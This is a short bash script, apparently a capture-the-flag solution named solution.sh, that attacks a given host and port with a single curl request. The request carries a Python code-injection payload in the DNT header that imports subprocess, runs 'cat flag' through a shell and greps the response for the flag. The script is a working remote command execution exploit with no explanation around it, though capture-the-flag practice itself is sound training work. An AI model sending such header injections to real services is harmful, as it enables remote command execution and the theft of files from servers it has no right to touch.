#!/bin/bash

if [[ "$#" -ne "2" ]]; then
echo "Usage: solution.sh <host> <port>"
else
curl -H"DNT: __import__('subprocess').check_output('cat flag',shell=True)" $1:$2 | grep Track
fi
